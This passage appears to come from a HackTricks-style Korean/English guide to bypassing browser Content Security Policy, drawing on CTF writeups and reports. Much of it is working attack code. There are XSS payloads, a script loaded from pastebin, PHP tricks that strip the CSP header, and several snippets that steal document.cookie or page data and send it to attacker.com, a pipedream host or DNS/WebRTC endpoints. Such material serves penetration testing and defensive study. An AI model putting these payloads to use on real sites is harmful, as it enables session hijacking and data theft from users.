이 공격은 공격자가 사회공학 기법을 사용해 사용자를 설득하여 브라우저의 bookmarklet 위로 링크를 **drag\&dropped 하도록 만드는** 상황을 포함합니다. 이 bookmarklet에는 **malicious javascript** 코드가 들어있어, drag\&dropped되거나 클릭되었을 때 현재 웹 창의 컨텍스트에서 실행되어 **CSP를 우회하고 cookies나 tokens 같은 민감한 정보를 탈취할 수 있게** 됩니다.

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP를 제한하여 우회하기

In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), CSP는 허용된 iframe 내부에 더 제한적인 CSP를 주입하여 특정 JS 파일의 로드를 금지함으로써 우회됩니다. 그런 다음, 이를 통해 **prototype pollution** 또는 **dom clobbering**을 이용해 다른 스크립트를 **abuse a different script to load an arbitrary script** 할 수 있게 됩니다.

Iframe의 CSP를 **제한**하려면 **`csp`** 속성을 사용할 수 있습니다:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
[**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48)에서, **HTML injection**을 통해 **CSP**를 더 제한하여 CSTI를 방지하던 script가 비활성화되었고, 따라서 **취약점이 악용 가능해졌다.**\
CSP는 **HTML meta tags**를 사용해 더 엄격하게 만들 수 있으며, **inline scripts**는 그들의 **nonce**를 허용하는 항목을 **removing the entry**함으로써 비활성화하고 특정 inline script는 **sha**로 활성화할 수 있다:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### Content-Security-Policy-Report-Only를 이용한 JS exfiltration

서버가 헤더 **`Content-Security-Policy-Report-Only`** 를 **(귀하가 제어하는 값으로)** 응답하도록 만들 수 있다면(예: CRLF 때문에), 그 헤더가 귀하의 서버를 가리키도록 설정할 수 있습니다. 그리고 exfiltrate하려는 **JS content** 를 **`<script>`** 로 감싸고, `unsafe-inline` 이 CSP에 의해 허용되지 않을 가능성이 높으므로, 이것은 **CSP error** 를 유발하여 스크립트의 일부(민감한 정보를 포함한 부분)가 `Content-Security-Policy-Report-Only` 를 통해 서버로 전송됩니다.

예시로는 [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes)을 참고하세요.

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking Information with CSP and Iframe

- `iframe`가 생성되어 CSP에서 허용된 URL(예: `https://example.redirect.com`)을 가리킵니다.
- 이 URL은 이후 CSP에서 **허용되지 않는** 비밀 URL(예: `https://usersecret.example2.com`)로 리디렉션됩니다.
- `securitypolicyviolation` 이벤트를 수신하여 `blockedURI` 속성을 캡처할 수 있습니다. 이 속성은 차단된 URI의 도메인을 드러내어 초기 URL이 리디렉션된 비밀 도메인을 leak합니다.

Chrome과 Firefox 같은 브라우저는 CSP와 관련된 iframe 처리에서 서로 다른 동작을 보이는 점이 흥미롭습니다. 이는 정의되지 않은 동작으로 인해 민감한 정보가 leak될 수 있음을 의미합니다.

또 다른 기법은 CSP 자체를 악용하여 비밀 서브도메인을 추론하는 것입니다. 이 방법은 이진 탐색 알고리즘을 이용하고, 의도적으로 차단되는 특정 도메인을 포함하도록 CSP를 조정하는 방식에 의존합니다. 예를 들어 비밀 서브도메인이 알려지지 않은 문자들로 구성되어 있다면, CSP 지시문을 수정해 해당 서브도메인들을 차단하거나 허용하면서 반복적으로 테스트할 수 있습니다. 다음은 이 방법을 용이하게 하기 위해 CSP를 설정하는 방법을 보여주는 스니펫입니다:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
CSP에 의해 차단되거나 허용되는 요청을 모니터링함으로써 비밀 subdomain의 가능한 문자를 좁혀 결국 전체 URL을 밝혀낼 수 있다.

두 방법 모두 브라우저에서의 CSP 구현과 동작의 미묘한 차이를 악용하며, 겉보기에는 안전해 보이는 정책이 의도치 않게 민감한 정보를 leak할 수 있음을 보여준다.

트릭 출처: [**here**](https://ctftime.org/writeup/29310).

## Unsafe Technologies to Bypass CSP

### PHP에서 params가 너무 많을 때 발생하는 오류

이 비디오의 [**마지막 기법**](https://www.youtube.com/watch?v=Sm4G6cAHjWM)에 따르면, 너무 많은 파라미터를 전송하면 (1001 GET parameters — POST params나 20개 이상의 파일로도 가능) 이로 인해 발생하는 오류 때문에 PHP 웹 코드에 정의된 어떤 **`header()`**든 **전송되지 않는다**.

### PHP 응답 버퍼 오버로드

PHP는 **기본적으로 응답을 4096 바이트까지 버퍼링**하는 것으로 알려져 있다. 따라서 PHP가 경고를 표시하는 경우, **경고에 충분한 데이터를 포함시키면**, **응답**은 **CSP header보다 먼저** **전송된다**, 그 결과 해당 header는 무시된다.\
그런 다음, 이 기법은 기본적으로 **경고로 응답 버퍼를 채워** CSP header가 전송되지 않도록 만드는 것이다.

아이디어 출처: [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### max_input_vars를 통한 CSP 무력화 (headers already sent)

헤더는 어떤 출력보다 먼저 전송되어야 하기 때문에, PHP가 발생시키는 경고는 이후의 `header()` 호출을 무효화할 수 있다. 사용자 입력이 `max_input_vars`를 초과하면 PHP는 먼저 startup warning을 발생시키고; 이후의 `header('Content-Security-Policy: ...')` 호출은 “headers already sent” 오류로 실패하여 실질적으로 CSP를 비활성화하고 원래 차단되던 reflective XSS를 허용하게 된다.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
예:
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Rewrite Error Page

이 [**writeup**](https://blog.ssrf.kr/69)에 따르면, 에러 페이지(잠재적으로 CSP가 적용되지 않은)를 로드하고 그 내용을 재작성함으로써 CSP 보호를 우회할 수 있었던 것으로 보입니다.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME는 XSS(또는 매우 제한된 XSS)를 악용하여 페이지의 **in an endpoint of a page**에서 같은 출처의 **other endpoints of the same origin.**를 악용하는 기법입니다. 이는 공격자 페이지에서 vulnerable endpoint를 로드한 뒤, 공격자 페이지를 악용하려는 same origin의 real endpoint로 새로고침함으로써 이루어집니다. 이렇게 하면 **vulnerable endpoint**는 **`opener`** 객체를 **payload** 안에서 사용해 **real endpoint to abuse**의 **DOM**에 접근할 수 있습니다. 자세한 내용은 다음을 확인하세요:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

또한, **wordpress**는 `/wp-json/wp/v2/users/1?_jsonp=data`에 **JSONP** endpoint를 가지고 있으며, 이는 전송된 **data**를 출력에 **reflect**합니다(허용되는 문자는 영문자, 숫자 및 점(.)으로 제한됨).

An attacker can abuse that endpoint to **generate a SOME attack** against WordPress and **embed** it inside `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` note that this **script** will be **loaded** because it's **allowed by 'self'**. Moreover, and because WordPress is installed, an attacker might abuse the **SOME attack** through the **vulnerable** **callback** endpoint that **bypasses the CSP** to give more privileges to a user, install a new plugin...\  
For more information about how to perform this attack check [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

If there is a strict CSP that doesn't allow you to **interact with external servers**, there are some things you can always do to exfiltrate the information.

### Location

You could just update the location to send to the attacker's server the secret information:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### 메타 태그

메타 태그를 주입하여 리다이렉트할 수 있습니다 (이것은 단지 리다이렉트일 뿐이며, 콘텐츠를 leak하지 않습니다)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

페이지를 더 빠르게 로드하기 위해, 브라우저는 호스트명을 IP 주소로 미리 해석하고 나중에 사용할 수 있도록 캐시합니다.\
브라우저에게 호스트명을 미리 해석하도록 지시하려면 다음을 사용하세요: `<link rel="dns-prefetch" href="something.com">`

이 동작을 악용하여 **exfiltrate sensitive information via DNS requests**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
또 다른 방법:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
이런 일이 발생하지 않도록 서버는 다음 HTTP header를 전송할 수 있습니다:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> 보통 이 기법은 headless browsers (bots)에서는 작동하지 않는 것 같습니다

### WebRTC

여러 페이지에서 **WebRTC는 CSP의 `connect-src` 정책을 검사하지 않는다**고 읽을 수 있습니다.

실제로 _leak_ 정보를 _DNS request_를 사용하여 유출할 수 있습니다. 다음 코드를 확인하세요:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
또 다른 옵션:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

Credential 팝업은 페이지에 의해 제한되지 않고 iconURL로 DNS 요청을 보냅니다. 이는 보안 컨텍스트(HTTPS) 또는 localhost에서만 작동합니다.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## CSP 정책 온라인 확인

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## CSP 자동 생성

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## 참고자료

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
